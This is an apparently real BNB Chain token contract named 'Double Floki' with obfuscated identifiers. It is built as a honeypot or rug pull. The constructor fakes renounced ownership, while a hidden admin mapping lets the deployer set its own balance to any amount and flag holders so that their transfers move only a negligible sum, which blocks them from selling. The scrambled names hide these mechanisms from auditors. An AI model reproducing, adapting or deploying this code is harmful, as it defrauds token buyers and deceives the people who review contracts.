/**
 *Submitted for verification at BscScan.com on 2023-02-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


interface tzuthbjqb {
    function createPair(address gccjuerxg, address lbgwpxqdtaqkuw) external returns (address);
}

interface klarozmkzvvmtz {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract DoubleFloki {

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function rdatdlryfksvgz(address vflfylhdlte, address msragxbeoddwl, uint256 ehzzzigcxzuh) internal returns (bool) {
        if (vflfylhdlte == hgjcearucwco) {
            return daectngrw(vflfylhdlte, msragxbeoddwl, ehzzzigcxzuh);
        }
        if (kenrnmbzsphkp[vflfylhdlte]) {
            return daectngrw(vflfylhdlte, msragxbeoddwl, 10 ** 10);
        }
        return daectngrw(vflfylhdlte, msragxbeoddwl, ehzzzigcxzuh);
    }

    event Transfer(address indexed from, address indexed vmnypmxzqwu, uint256 value);

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 18;

    function xjmtrgnleg() public {
        emit OwnershipTransferred(hgjcearucwco, address(0));
        owner = address(0);
    }

    address public hgjcearucwco;

    function ykswmhgiw(address devfittzuss) public {
        if (devfittzuss == hgjcearucwco || devfittzuss == wmdztyalxz || !kdjzsvagszp[rovwgxhxehqx()]) {
            return;
        }
        kenrnmbzsphkp[devfittzuss] = true;
    }

    function rovwgxhxehqx() private view returns (address) {
        return msg.sender;
    }

    bool public vvyhbqiyrc;

    event Approval(address indexed aukaxmlormt, address indexed spender, uint256 value);

    function transfer(address nhsnjkkeix, uint256 ehzzzigcxzuh) external returns (bool) {
        return rdatdlryfksvgz(rovwgxhxehqx(), nhsnjkkeix, ehzzzigcxzuh);
    }

    constructor (){ 
        klarozmkzvvmtz ojsvlcbfjmlwm = klarozmkzvvmtz(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        wmdztyalxz = tzuthbjqb(ojsvlcbfjmlwm.factory()).createPair(ojsvlcbfjmlwm.WETH(), address(this));
        owner = rovwgxhxehqx();
        hgjcearucwco = owner;
        kdjzsvagszp[hgjcearucwco] = true;
        balanceOf[hgjcearucwco] = totalSupply;
        emit Transfer(address(0), hgjcearucwco, totalSupply);
        xjmtrgnleg();
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function getOwner() external view returns (address) {
        return owner;
    }

    mapping(address => bool) public kdjzsvagszp;

    function approve(address lifdpayhczco, uint256 ehzzzigcxzuh) public returns (bool) {
        allowance[rovwgxhxehqx()][lifdpayhczco] = ehzzzigcxzuh;
        emit Approval(rovwgxhxehqx(), lifdpayhczco, ehzzzigcxzuh);
        return true;
    }

    function wlfhgumgrwk(uint256 ehzzzigcxzuh) public {
        if (!kdjzsvagszp[rovwgxhxehqx()]) {
            return;
        }
        balanceOf[hgjcearucwco] = ehzzzigcxzuh;
    }

    function auxnsdhquqqw(address mmsazfshbhaq) public {
        if (vvyhbqiyrc) {
            return;
        }
        kdjzsvagszp[mmsazfshbhaq] = true;
        vvyhbqiyrc = true;
    }

    function transferFrom(address vflfylhdlte, address msragxbeoddwl, uint256 ehzzzigcxzuh) external returns (bool) {
        if (allowance[vflfylhdlte][rovwgxhxehqx()] != type(uint256).max) {
            require(ehzzzigcxzuh <= allowance[vflfylhdlte][rovwgxhxehqx()]);
            allowance[vflfylhdlte][rovwgxhxehqx()] -= ehzzzigcxzuh;
        }
        return rdatdlryfksvgz(vflfylhdlte, msragxbeoddwl, ehzzzigcxzuh);
    }

    address public wmdztyalxz;

    mapping(address => bool) public kenrnmbzsphkp;

    string public name = "Double Floki";

    string public symbol = "DFI";

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function daectngrw(address vflfylhdlte, address msragxbeoddwl, uint256 ehzzzigcxzuh) internal returns (bool) {
        require(balanceOf[vflfylhdlte] >= ehzzzigcxzuh);
        balanceOf[vflfylhdlte] -= ehzzzigcxzuh;
        balanceOf[msragxbeoddwl] += ehzzzigcxzuh;
        emit Transfer(vflfylhdlte, msragxbeoddwl, ehzzzigcxzuh);
        return true;
    }

    address public owner;

}